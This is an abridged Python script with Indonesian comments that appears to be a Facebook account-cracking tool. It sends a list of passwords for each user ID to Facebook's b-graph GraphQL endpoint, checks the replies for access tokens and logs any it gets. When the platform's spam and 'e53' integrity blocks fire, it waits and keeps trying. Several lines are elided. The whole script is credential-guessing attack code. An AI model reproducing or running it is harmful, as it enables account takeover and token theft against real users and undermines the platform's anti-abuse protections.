###-----[ IMPORT MODULE ]-----###
import requests, json, os, sys, random, datetime, time, re, uuid, logging
...
logging.basicConfig(
    ...
    handlers=[
        logging.FileHandler("dezfbevo_debug.log", encoding="utf-8")
    ]
)
# Kurangi spam log library requests bawaan
...
def _graphql_native_(uid, nm, pasw):
	...
	for pw in pasw:
		...
		try:
			...
			logging.debug(f"[{uid}] --> POST https://b-graph.facebook.com/graphql")
			logging.debug(f"[{uid}] Headers: {json.dumps(head, indent=2)}")
			logging.debug(f"[{uid}] Payload: {json.dumps(payload, indent=2)}")
			
			response = requests.post("https://b-graph.facebook.com/graphql", headers=head, data=payload, timeout=10)
			
			logging.debug(f"[{uid}] <-- Status Code: {response.status_code}")
			res_teks = response.text
			logging.debug(f"[{uid}] <-- Raw Response: {res_teks}")
			...
			if ("access_token" in res_teks or "EAAAA" in res_teks) and ("www_request_id" in res_teks or "session_key" in res_teks):
				...
				logging.info(f"[{uid}] MATCH: OK, Token: {token[:20]}...")
				...
				logging.info(f"[{uid}] MATCH: Kredensial Salah")
				continue
				...
				sys.stdout.flush()
				logging.warning(f"[{uid}] SPAM BLOCK DETECTED: {res_teks[:100]}")
				time.sleep(5)
				continue
			...
			elif "e53" in res_teks.lower():
				logging.warning(f"[{uid}] MATCH: Kena Block e53 Integrity Check")
				continue
				
			else:
				logging.warning(f"[{uid}] MATCH: Response tidak dikenali, lanjut iterasi.")
				continue
				
		except requests.exceptions.ConnectionError:
			logging.error(f"[{uid}] Error: ConnectionError")
			time.sleep(15)
		except requests.exceptions.ReadTimeout:
			logging.error(f"[{uid}] Error: ReadTimeout")
			time.sleep(5)
